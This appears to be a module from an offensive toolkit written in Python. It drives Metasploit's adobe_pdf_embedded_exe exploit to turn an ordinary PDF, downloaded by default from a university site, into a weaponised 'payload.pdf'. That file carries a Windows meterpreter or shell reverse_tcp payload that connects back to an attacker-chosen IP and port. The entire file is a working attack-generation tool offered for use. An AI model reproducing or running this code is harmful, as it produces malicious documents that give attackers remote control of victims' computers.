#!/usr/bin/python
#
# msfpayload to pdf

import os
import sys
import time
import urllib
import shutil
import subprocess
from src.core import menus
from src.core.main import *
from time import sleep

while 1:
	try:
		# msf path
		path = msfpath()
		# auto ip detection
		iface = iface_ip()		
				
		clear()
        # select payload
		selection = 0
		while selection != range(1,4):
			clear()
			menus.pdf_title()
			ip = raw_input("\n Enter your local or remote ip (%s): " % iface)
			if ip == '':
				ip = iface
			port = raw_input(" Enter a port (default 8080): ")
			if port == '':
				port = 8080
			infile = raw_input(" Enter path to pdf file or (Hit enter to download good.pdf): ")
			if infile == '':
				PrintInfo("Downloading PDF file to /tmp")
				time.sleep(1)
				urllib.urlretrieve('http://www.cs.berkeley.edu/~brewer/cs262/FFS.pdf','/tmp/good.pdf')
				infile = '/tmp/good.pdf'
			filename = raw_input("\n Enter a name for your pdf (default payload.pdf): ")
			if filename == '':
				filename = 'payload.pdf'
			sleep(1)
			
			menus.pdf_menu()
			selection = raw_input(" %sSelection > %s" % (colours.bold, colours.reset))
			if selection == '1' or selection == '':
				payload = "windows/meterpreter/reverse_tcp"
				payload2 = "windows/meterpreter/reverse_tcp"
				break
			if selection == '2':
				payload = "windows/shell/reverse_tcp"
				payload2 = "windows/shell/reverse_tcp"
				break
			if selection == '3':
				payload = "windows/x64/meterpreter/reverse_tcp"
				payload2 = "windows/x64/meterpreter/reverse_tcp"
				break
			if selection == '4':
				payload = "windows/x64/shell/reverse_tcp"
				payload2 = "windows/x64/shell/reverse_tcp"
				break

		PrintInfo("Generating payload.pdf please wait..")
		print ""
		sleep(1)
				
		# setup for windows/fileformat/adobe_pdf_embedded_exe
		exploit = "windows/fileformat/adobe_pdf_embedded_exe"
		payload = ("PAYLOAD=%s" % payload)
		localhost = ("LHOST=%s" % ip)
		listenport = ("LPORT=%s" % port)
		goodpdf = ("INFILENAME=%s" % infile)
		badpdf = ("FILENAME=%s" % filename)
		execute = "E"

		# start windows/fileformat/adobe_pdf_embedded_exe exploit with msfcli
		subprocess.Popen("%s/msfcli %s %s %s %s %s %s %s" % (msfpath(), exploit, payload, localhost, listenport, goodpdf, badpdf, execute), shell=True).wait()
		
		# moves file from ~/.msf4/local/ to /tmp 
		# still need to figure out how to get filename sent to /tmp
		shutil.move(os.getenv('HOME')+'/.msf4/local/payload.pdf','output/payload.pdf')
		sleep(1)
		
		PrintInfo("payload.pdf is currently being moved to the output directory.")
		sleep(1)
		
		# return to main
		# clean up
		os.remove(infile)
		EntContinue()
		break
	
	except KeyboardInterrupt:
		break
